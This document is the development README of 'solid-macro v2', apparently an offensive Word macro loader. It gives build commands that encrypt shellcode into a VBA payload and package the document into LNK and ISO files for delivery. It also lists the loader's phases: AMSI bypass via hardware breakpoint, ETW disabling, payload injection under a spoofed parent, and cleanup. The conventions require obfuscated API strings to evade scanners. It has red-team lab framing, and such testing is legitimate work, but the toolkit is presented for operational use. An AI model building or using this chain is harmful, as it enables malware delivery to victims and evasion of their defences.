# Development

How to build, test, and verify solid-macro v2.

## Prerequisites

- Python 3.10+
- For ISO delivery: `pycdlib==1.14.0` (via `delivery/iso/requirements.txt`)
- For manual VBA testing: x64 Windows 11 + x64 Microsoft Office 2016+ in a
  lab VM (the repo does not ship a VBA test harness)

## Build flow

The macro is assembled from `.bas` source modules into a set of files ready
to import into Word's VBA editor.

```
# 1. Encrypt your shellcode and generate Payload.bas
python payload/build.py path/to/shellcode.bin --out macro/Payload.bas

# 2. Run static checks on all .bas modules
python macro/build/assemble.py --check

# 3. Assemble into macro/build/dist/
python macro/build/assemble.py

# 4. (Optional) bundle for delivery
python delivery/lnk/build_lnk.py --target "data\\report.docm" --out report.lnk
python delivery/iso/build_iso.py report.lnk data/report.docm --out report.iso
```

`assemble.py --flatten` produces a single `Module1.bas` if you prefer
copy-paste over module-by-module import.

If your distribution's interpreter is `python3` rather than `python`, swap
the command accordingly.

## Testing

Python side (all automated):

```
pip install pytest pycdlib==1.14.0
python -m pytest tests/ -v
```

Expected: 40+ tests across `test_assemble`, `test_aes`, `test_build`,
`test_lnk`, `test_iso`. NIST AES KAT vectors pin the AES implementation;
byte-level LNK and ISO round-trips pin the delivery tooling.

VBA side (manual, in a lab VM):

1. **Compile check.** Import each module from `macro/build/dist/` into Word's
   VBA editor in dependency order: Strings, Structs, Engine, Aes, Syscalls,
   Evasion, Injection, Payload, SolidMacro, Debug. Hit
   `Debug > Compile VBAProject`. All modules should compile clean under
   `Option Explicit`.

2. **Phase-telemetry walk.** With `Debug.bas` `DEBUG_ENABLED = True`, run
   DebugView (Sysinternals) on the lab VM with the `winword.exe` filter,
   then open the assembled `.docm`. You should see:

   ```
   [+] solid-macro v2 AutoOpen
   [+] Phase 3: ResolveSyscalls
   [+] Phase 4a: InstallAmsiHWBP
   [+] Phase 4b: KillEtwForThisThread
   [+] Phase 5: Decrypt payload
   [+] Phase 6: Inject
   [+] Phase 7: Schedule Cleanup for Now+2s
   ```

   Each missing line tells you exactly where the chain stalled.

3. **End-to-end smoke** (only with a benign payload you control, in an
   isolated VM): provide a `windows/x64/exec CMD=calc.exe` shellcode via
   `payload/build.py`, assemble, open the `.docm`, observe calc.exe spawn
   under the spoofed parent (verify via Process Explorer / ProcessHacker).

## Lab setup

- Win11 24H2 VM, snapshot before each test session.
- Disable Defender real-time protection if it interferes with shellcode
  execution. For accurate detection-profile testing, leave it on and
  observe what trips.
- Install Sysinternals `DebugView`, `Process Explorer`, `Procmon`.
- Optional: install MDE (M365 trial) on a separate VM to validate the
  threat-model claims about which detection rule trips.

## Project conventions

- ASCII-only source files (no em-dashes, curly quotes, emoji).
- Commits attributable to `noderaven` exclusively.
- No flat sensitive API name literals in `.bas` source -- use `MkStr`/`MkAStr`.
  `assemble.py --check` enforces.
- Public function names in VBA modules use PascalCase; private helpers may
  use camelCase or PascalCase per local convention.
